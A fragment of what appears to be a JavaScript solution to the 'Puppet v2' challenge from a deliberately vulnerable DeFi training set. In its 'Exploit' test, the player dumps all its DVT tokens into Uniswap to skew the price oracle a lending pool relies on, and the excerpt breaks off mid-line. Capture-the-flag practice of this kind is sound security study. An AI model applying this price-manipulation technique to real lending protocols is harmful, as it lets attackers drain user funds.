...
describe('[Challenge] Puppet v2', function () {
    ...
    it('Exploit', async function () {
        ...
        await uniswapRouter.connect(player).swapExactTokensForETH(
            PLAYER_INITIAL_TOKEN_BALANCE, // DVT token in
            1, // min ETH out
            [token.address, weth.address], // array of trading pair addresses
            player.address, // recipient
            (await ethers.provider.getBlock('latest')).timestamp * 2 // the swap deadline 
        ) 
        const WETHDepositAmount = await lendingPool
